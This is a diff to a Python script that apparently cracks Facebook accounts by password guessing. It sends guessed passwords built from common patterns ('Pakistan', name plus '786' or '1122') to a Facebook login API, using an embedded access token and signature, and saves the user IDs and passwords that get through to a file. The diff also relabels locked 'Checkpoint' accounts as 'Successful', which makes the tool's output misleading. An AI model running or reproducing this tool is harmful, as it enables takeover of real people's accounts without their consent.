@@ -61,7 +61,7 @@ def download():
     for o in titik:
         print(" Downloading "+o),;sys.stdout.flush();time.sleep(0.5)
 logo = """
-\033[1;97m----------------------------------------------------------------------------
+\033[1;97m---------------------------------------------------------------------------- Created By MOHSIN ALI
 \033[1;97m----------------------------------------------------------------------------
  Coded by : \033[1;91m Mohsin Ali
  Facebook : \033[1;91m MOHSIN.ALI.THE.FATHER.OF.HATERX
@@ -364,11 +364,11 @@ def crack2():
 		                                    ok.close()
 		                                    oks.append(uid)
 		                                else:
-		                                    pass5="1122334455"
+		                                    pass5="Pakistan"
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                    d=json.loads(q)
 		                                    if 'www.facebook.com' in d['error_msg']:
-		                                        print("\033[1;90m[\033[1;93mCheckpoint\033[1;90m]\033[1;97m "+uid+" "+pass5+" ")
+		                                        print("\033[1;90m[\033[1;93mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass5+" ")
 		                                        cp=open("cp.txt","a")
 		                                        cp.write(uid+" | "+pass5+"\n")
 		                                        cp.close()
@@ -381,7 +381,7 @@ def crack2():
 		                                            ok.close()
 		                                            oks.append(uid)
 		                                        else:
-		                                            pass6=name+"1212"
+		                                            pass6=name+"1122"
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                            d=json.loads(q)
 		                                            if 'www.facebook.com' in d['error_msg']:
@@ -398,7 +398,7 @@ def crack2():
 		                                                    ok.close()
 		                                                    oks.append(uid)
 		                                                else:
-		                                                    pass7=name+"1122"
+		                                                    pass7=name+"786"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
 		                                                    if 'www.facebook.com' in d['error_msg']:
